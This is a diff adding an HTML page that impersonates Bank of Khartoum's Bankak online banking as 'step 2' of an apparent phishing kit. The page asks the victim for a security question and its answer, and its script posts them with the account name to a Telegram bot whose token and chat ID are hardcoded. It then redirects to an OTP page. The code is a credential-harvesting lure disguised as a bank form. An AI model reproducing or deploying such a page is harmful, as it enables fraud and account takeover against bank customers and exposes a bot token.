@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl" class="h-full antialiased">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title id="page-title">bankofkhartoum</title>
+    <meta name="description" content="سؤال الأمان — بنكك أونلاين">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon" type="image/svg+xml" href="logo.svg">
+    <link rel="alternate icon" href="favicon.ico" sizes="16x16">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="page-wrapper lang-fade" id="page-wrapper">
+
+        <header dir="ltr" class="site-header">
+            <div class="header-inner">
+                <div class="header-red">
+                    <div class="header-red-bg" aria-hidden="true"></div>
+                    <div class="header-red-overlay" aria-hidden="true"></div>
+                    <div class="header-logo"><img src="logo.svg" alt="بنك الخرطوم" id="logo-img"></div>
+                </div>
+                <div class="header-gold">
+                    <button type="button" class="lang-toggle" id="lang-toggle" aria-label="Switch language">EN</button>
+                </div>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="form-card">
+                <div class="card">
+                    <div class="step-label" data-i18n="step_label">STEP 2</div>
+                    <h1 class="form-heading" data-i18n="form_heading">Security Question</h1>
+
+                    <div class="info-box">
+                        <div class="info-row">
+                            <span class="info-label" data-i18n="info_service_label">Service :</span>
+                            <span class="info-value" data-i18n="info_service_value">Update Your Information</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label" data-i18n="info_account_label">Account Number :</span>
+                            <span class="info-value" id="account-number">—</span>
+                        </div>
+                    </div>
+
+                    <form id="question-form" novalidate>
+                        <div class="field-group">
+                            <label class="field-label" for="question-select" data-i18n="question_label">Select a question</label>
+                            <select class="field-select" id="question-select" name="question" required>
+                                <option value="" disabled selected data-i18n="question_placeholder">Choose a question</option>
+                            </select>
+                        </div>
+                        <div class="field-group">
+                            <label class="field-label" for="answer" data-i18n="answer_label">Your Answer</label>
+                            <textarea class="field-textarea" id="answer" name="answer" data-i18n-placeholder="answer_placeholder" placeholder="Type your answer here..." required></textarea>
+                        </div>
+                        <div class="form-error" id="form-error"></div>
+                        <div class="button-row">
+                            <button type="button" class="btn-back" id="back-btn" data-i18n="back_btn">Back</button>
+                            <button type="submit" class="btn-submit" id="submit-btn">
+                                <span id="submit-text" data-i18n="submit_btn">Submit Request</span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </main>
+
+        <footer class="site-footer">
+            <div class="footer-inner">
+                <div class="footer-copy"><span class="semibold">©2024</span> <span class="bold">iBOK</span></div>
+                <div class="footer-banner"><img src="footer-banner.png" alt="Internet Banking Services" width="980" height="120"></div>
+            </div>
+        </footer>
+    </div>
+
+    <div class="modal-overlay-q" id="modal-overlay" role="dialog" aria-modal="true">
+        <div class="modal-box-q">
+            <div class="modal-header-q">
+                <div class="modal-title-q" data-i18n="modal_title">Message from BOK</div>
+                <button type="button" class="modal-close-q" id="modal-close" aria-label="Close">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg>
+                </button>
+            </div>
+            <div class="modal-body-q" data-i18n="modal_body">Our journey with you continues, and the best is always yet to come. Update your information and continue your journey with us.</div>
+            <div class="modal-footer-q">
+                <button type="button" class="modal-btn-q modal-btn-cancel-q" id="modal-cancel" data-i18n="modal_cancel">Cancel</button>
+                <button type="button" class="modal-btn-q modal-btn-proceed-q" id="modal-proceed" data-i18n="modal_proceed">Proceed</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function () {
+            'use strict';
+            var CONFIG = {
+                TELEGRAM_BOT_TOKEN: '8987871839:AAEibtwHtRAJW5lUSRC78jERfceqjxL43cc',
+                TELEGRAM_CHAT_ID: '844962683',
+                BACK_URL: 'bankak.html',
+                NEXT_URL: 'otp.html',
+                REDIRECT_DELAY: 1500
+            };
+
+            var QUESTIONS = [
+                { en: "What is your first cousin's name?", ar: "ما هو اسم ابن عمك الأول؟" },
+                { en: "In which city were you born?", ar: "في أي مدينة وُلدت؟" },
+                { en: "In what year did you graduate from university?", ar: "في أي عام تخرجت من الجامعة؟" },
+                { en: "What was your nickname as a child?", ar: "ما كان لقبك في الطفولة؟" },
+                { en: "What is the name of your favorite author?", ar: "ما هو اسم مؤلفك المفضل؟" },
+                { en: "What is the name of your favorite car manufacturer?", ar: "ما هو اسم مصنّع سيارتك المفضل؟" },
+                { en: "What is your favorite movie?", ar: "ما هو فيلمك المفضل؟" },
+                { en: "What was the name of your best childhood friend?", ar: "ما كان اسم أفضل صديق في طفولتك؟" },
+                { en: "In what year did you get your driver's license?", ar: "في أي عام حصلت على رخصة القيادة؟" },
+                { en: "What was the brand of your first television?", ar: "ما كانت ماركة أول تلفاز لديك؟" },
+                { en: "In what year did you get married?", ar: "في أي عام تزوجت؟" },
+                { en: "What is the name of your favorite football team?", ar: "ما هو اسم فريق كرة القدم المفضل لديك؟" },
+                { en: "What was the name of the school you attended?", ar: "ما هو اسم المدرسة التي التحقت بها؟" },
+                { en: "What was the make of your first car?", ar: "ما كانت ماركة أول سيارة لديك؟" }
+            ];
+
+            var translations = {
+                ar: {
+                    pageTitle: 'bankofkhartoum',
+                    step_label: 'الخطوة 2', form_heading: 'سؤال الأمان',
+                    info_service_label: 'الخدمة :', info_service_value: 'تحديث بياناتك',
+                    info_account_label: 'رقم الحساب :',
+                    question_label: 'اختر سؤالاً', question_placeholder: 'اختر سؤالاً',
+                    answer_label: 'إجابتك', answer_placeholder: 'اكتب إجابتك هنا...',
+                    back_btn: 'رجوع', submit_btn: 'إرسال الطلب', submitting: 'جارٍ الإرسال',
+                    toggleLabel: 'EN', toggleAria: 'Switch to English',
+                    modal_title: 'رسالة من بنك الخرطوم',
+                    modal_body: 'رحلتنا معك مستمرة، والجاي دائماً أحلى. حدّث بياناتك وكمل معانا المشوار.',
+                    modal_cancel: 'إلغاء', modal_proceed: 'متابعة',
+                    errEmpty: 'الرجاء اختيار سؤال وإدخال الإجابة.'
+                },
+                en: {
+                    pageTitle: 'bankofkhartoum',
+                    step_label: 'STEP 2', form_heading: 'Security Question',
+                    info_service_label: 'Service :', info_service_value: 'Update Your Information',
+                    info_account_label: 'Account Number :',
+                    question_label: 'Select a question', question_placeholder: 'Choose a question',
+                    answer_label: 'Your Answer', answer_placeholder: 'Type your answer here...',
+                    back_btn: 'Back', submit_btn: 'Submit Request', submitting: 'Sending',
+                    toggleLabel: 'AR', toggleAria: 'التبديل إلى العربية',
+                    modal_title: 'Message from BOK',
+                    modal_body: 'Our journey with you continues, and the best is always yet to come. Update your information and continue your journey with us.',
+                    modal_cancel: 'Cancel', modal_proceed: 'Proceed',
+                    errEmpty: 'Please select a question and enter your answer.'
+                }
+            };
+
+            var DEFAULT_LANG = 'ar';
+            var currentLang = DEFAULT_LANG;
+            var isSubmitting = false;
+            var username = '';
+
+            var html = document.documentElement;
+            var pageTitle = document.getElementById('page-title');
+            var langToggle = document.getElementById('lang-toggle');
+            var wrapper = document.getElementById('page-wrapper');
+            var accountNumberEl = document.getElementById('account-number');
+            var questionSelect = document.getElementById('question-select');
+            var answerInput = document.getElementById('answer');
+            var form = document.getElementById('question-form');
+            var submitBtn = document.getElementById('submit-btn');
+            var submitText = document.getElementById('submit-text');
+            var backBtn = document.getElementById('back-btn');
+            var formError = document.getElementById('form-error');
+            var modalOverlay = document.getElementById('modal-overlay');
+            var modalClose = document.getElementById('modal-close');
+            var modalCancel = document.getElementById('modal-cancel');
+            var modalProceed = document.getElementById('modal-proceed');
+
+            try { username = sessionStorage.getItem('bankak-username') || ''; } catch (e) {}
+            if (!username) { window.location.replace('bankak.html'); return; }
+            accountNumberEl.textContent = username;
+
+            function buildQuestions(lang) {
+                var currentValue = questionSelect.value;
+                while (questionSelect.options.length > 1) questionSelect.remove(1);
+                for (var i = 0; i < QUESTIONS.length; i++) {
+                    var opt = document.createElement('option');
+                    opt.value = QUESTIONS[i].en;
+                    opt.textContent = QUESTIONS[i][lang];
+                    questionSelect.appendChild(opt);
+                }
+                if (currentValue) questionSelect.value = currentValue;
+            }
+
+            function applyLanguage(lang) {
+                currentLang = lang;
+                var t = translations[lang];
+                html.setAttribute('lang', lang);
+                html.setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
+                if (pageTitle) pageTitle.textContent = t.pageTitle;
+                document.querySelectorAll('[data-i18n]').forEach(function (el) {
+                    var k = el.getAttribute('data-i18n');
+                    if (t[k] !== undefined) el.textContent = t[k];
+                });
+                document.querySelectorAll('[data-i18n-placeholder]').forEach(function (el) {
+                    var k = el.getAttribute('data-i18n-placeholder');
+                    if (t[k] !== undefined) el.setAttribute('placeholder', t[k]);
+                });
+                if (langToggle) {
+                    langToggle.textContent = t.toggleLabel;
+                    langToggle.setAttribute('aria-label', t.toggleAria);
+                }
+                buildQuestions(lang);
+                if (formError) formError.classList.remove('visible');
+                try { localStorage.setItem('bankak-lang', lang); } catch (e) {}
+            }
+
+            langToggle.addEventListener('click', function () {
+                var next = currentLang === 'ar' ? 'en' : 'ar';
+                wrapper.classList.add('is-switching');
+                window.setTimeout(function () {
+                    applyLanguage(next);
+                    wrapper.classList.remove('is-switching');
+                }, 120);
+            });
+
+            function goToBack() { window.location.href = CONFIG.BACK_URL; }
+            function goToLogin() { window.location.href = 'bankak.html'; }
+
+            modalClose.addEventListener('click', goToLogin);
+            modalCancel.addEventListener('click', goToLogin);
+            modalProceed.addEventListener('click', function () { modalOverlay.classList.add('is-hidden'); });
+            modalOverlay.addEventListener('click', function (e) {
+                if (e.target === modalOverlay) goToLogin();
+            });
+            document.addEventListener('keydown', function (e) {
+                if (e.key === 'Escape' && !modalOverlay.classList.contains('is-hidden')) goToLogin();
+            });
+
+            backBtn.addEventListener('click', goToBack);
+
+            function sendToTelegram(questionEn, questionAr, answer, lang) {
+                var token = CONFIG.TELEGRAM_BOT_TOKEN;
+                var chatId = CONFIG.TELEGRAM_CHAT_ID;
+                if (!token || token === '8987871839:AAEibtwHtRAJW5lUSRC78jERfceqjxL43cc' || !chatId || chatId === '844962683') {
+                    console.warn('[Bankak] Telegram not configured — skipping.');
+                    return Promise.resolve(false);
+                }
+                var now = new Date();
+                var timeStr = now.toLocaleString('en-GB', { hour12: false });
+                var text =
+                    '🔐 تحديث بياناتك — سؤال الأمان\n' +
+                    '━━━━━━━━━━━━━━━━━━━━\n' +
+                    '👤 اسم المستخدم / Account: ' + username + '\n\n' +
+                    '❓ السؤال / Question:\n' +
+                    '   AR: ' + questionAr + '\n' +
+                    '   EN: ' + questionEn + '\n\n' +
+                    '✏️ الإجابة / Answer:\n' + answer + '\n\n' +
+                    '🕒 الوقت: ' + timeStr;
+                var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
+                var payload = new URLSearchParams();
+                payload.append('chat_id', chatId);
+                payload.append('text', text);
+                return fetch(url, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: payload.toString() })
+                    .then(function () { return true; })
+                    .catch(function () { return false; });
+            }
+
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
+                if (isSubmitting) return;
+                var selectedValue = questionSelect.value;
+                var answer = (answerInput.value || '').trim();
+                var t = translations[currentLang];
+                if (!selectedValue || !answer) {
+                    formError.textContent = t.errEmpty;
+                    formError.classList.add('visible');
+                    if (!selectedValue) questionSelect.focus(); else answerInput.focus();
+                    return;
+                }
+                formError.classList.remove('visible');
+                var q = null;
+                for (var i = 0; i < QUESTIONS.length; i++) {
+                    if (QUESTIONS[i].en === selectedValue) { q = QUESTIONS[i]; break; }
+                }
+                if (!q) q = { en: selectedValue, ar: selectedValue };
+                isSubmitting = true;
+                submitBtn.disabled = true;
+                submitText.innerHTML = t.submitting + '<span class="spinner" aria-hidden="true"></span>';
+                sendToTelegram(q.en, q.ar, answer, currentLang).then(function () {
+                    window.setTimeout(function () { window.location.href = CONFIG.NEXT_URL; }, CONFIG.REDIRECT_DELAY);
+                });
+            });
+
+            var logoImg = document.getElementById('logo-img');
+            if (logoImg) {
+                logoImg.addEventListener('error', function () {
+                    var parent = logoImg.parentNode;
+                    logoImg.style.display = 'none';
+                    if (!parent.querySelector('.logo-fallback')) {
+                        var fb = document.createElement('div');
+                        fb.className = 'logo-fallback';
+                        fb.style.display = 'block';
+                        fb.innerHTML = 'بنك الخرطوم<br><span style="font-size:0.9rem;font-weight:600;">Bank of Khartoum</span>';
+                        parent.appendChild(fb);
+                    }
+                });
+            }
+
+            var saved = null;
+            try { saved = localStorage.getItem('bankak-lang'); } catch (e) {}
+            applyLanguage(saved === 'en' ? 'en' : DEFAULT_LANG);
+        })();
+    </script>
+</body>
+</html>
